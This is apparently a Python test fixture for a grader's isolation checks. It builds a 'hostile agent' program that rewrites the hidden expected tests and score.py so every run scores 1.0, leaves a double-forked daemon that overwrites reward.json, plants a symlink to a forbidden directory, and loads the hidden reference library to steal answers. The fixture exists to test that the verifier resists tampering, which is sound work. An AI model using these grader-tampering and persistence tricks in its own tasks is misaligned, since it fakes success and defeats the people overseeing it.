"""A hostile agent program, for the verifier-isolation tests.

`program(...)` is Python source an agent could leave in its workspace for the verifier to run. When it runs it
rewrites files under the tests directory (expected_tests.json and score.py), leaves a double-forked, setsid daemon
with its stdio closed, (with `plant`) links a directory root will read from to one it must not read (the
parent-symlink confused deputy), and (with `steal`) loads the hidden reference library and prints its answer. The daemon waits for reward.json in the verifier's output directory and overwrites it with a
reward of 1.0 ("pwned"), so a grader that writes reward.json while the daemon still lives is caught. The daemon's
command line carries MARK and the output directory, so a test can find it (`survivors`) and clean up (`kill`).
"""

import os
import signal
from pathlib import Path

MARK = "collab-hostile-daemon"

DAEMON = r'''
import json, os, sys, time
reward = os.path.join(sys.argv[2], "reward.json")
end = time.time() + 120
while time.time() < end:
    try:
        if os.path.exists(reward) and "pwned" not in open(reward).read():
            with open(reward, "w") as f:
                f.write(json.dumps({"reward": 1.0, "pwned": 1}))
    except OSError:
        pass
    time.sleep(0.05)
'''


def program(tests: str, out: str, expected: list[str], daemon: bool = True,
            steal: tuple[str, str] | None = None, plant: tuple[str, str] | None = None,
            identity: bool = False) -> str:
    """Source that rewrites `tests` (expected_tests.json := `expected`; score.py always scores 1.0), with `daemon`
    leaves the daemon watching `out`, with `plant` = (expression for a link path, target) makes that symlink, and
    with `steal` = (library path, expression over `_lib` and `_sys.argv`) prints that expression as JSON and exits
    when the library can be read, and with `identity` ends by writing one line of its own os.getresuid(),
    os.getresgid() and sorted os.getgroups(), `resuid=(r, e, s) resgid=(r, e, s) groups=[...]` (identity_line), to
    stderr and exiting 3. Append the module's ordinary code (unreached with `identity`)."""
    score = "def score(workspace):\n    return {'reward': 1.0, 'requirements': {}}\n"
    src = f'''import json as _json, os as _os, sys as _sys
for _rel, _text in (("hidden/expected_tests.json", _json.dumps({expected!r})), ("score.py", {score!r})):
    try:
        with open(_os.path.join({tests!r}, _rel), "w") as _f:
            _f.write(_text)
    except OSError:
        pass
'''
    if daemon:
        src += f'''if _os.fork() == 0:
    try:
        _os.setsid()
        if _os.fork() == 0:
            _null = _os.open(_os.devnull, _os.O_RDWR)
            for _n in (0, 1, 2):
                _os.dup2(_null, _n)
            _os.execv(_sys.executable, [_sys.executable, "-c", {DAEMON!r}, {MARK!r}, {out!r}])
    finally:
        _os._exit(0)
'''
    if plant:
        link, target = plant
        src += f'''try:
    _os.symlink({target!r}, {link})
except OSError:
    pass
'''
    if steal:
        lib, expression = steal
        src += f'''try:
    import importlib.util as _util
    _spec = _util.spec_from_file_location("_stolen", {lib!r})
    _lib = _util.module_from_spec(_spec)
    _spec.loader.exec_module(_lib)
    _answer = {expression}
except Exception:
    pass
else:
    print(_json.dumps(_answer))
    _sys.exit(0)
'''
    if identity:
        src += '''_sys.stderr.write(f"resuid={_os.getresuid()} resgid={_os.getresgid()} groups={sorted(_os.getgroups())}")
_sys.exit(3)
'''
    return src


def identity_line(resuid, resgid, groups) -> str:
    """What a program made with `identity` writes, for these IDs."""
    return f"resuid={tuple(resuid)} resgid={tuple(resgid)} groups={sorted(groups)}"


def survivors(out: str) -> list[int]:
    """Live daemons this program left for output directory `out`."""
    found = []
    for name in os.listdir("/proc"):
        if not name.isdigit():
            continue
        try:
            argv = Path(f"/proc/{name}/cmdline").read_bytes().split(b"\0")
            state = Path(f"/proc/{name}/stat").read_text().rsplit(")", 1)[1].split()[0]
        except OSError:
            continue
        if MARK.encode() in argv and str(out).encode() in argv and state != "Z":
            found.append(int(name))
    return found


def kill(out: str) -> None:
    for pid in survivors(out):
        try:
            os.kill(pid, signal.SIGKILL)
        except OSError:
            pass
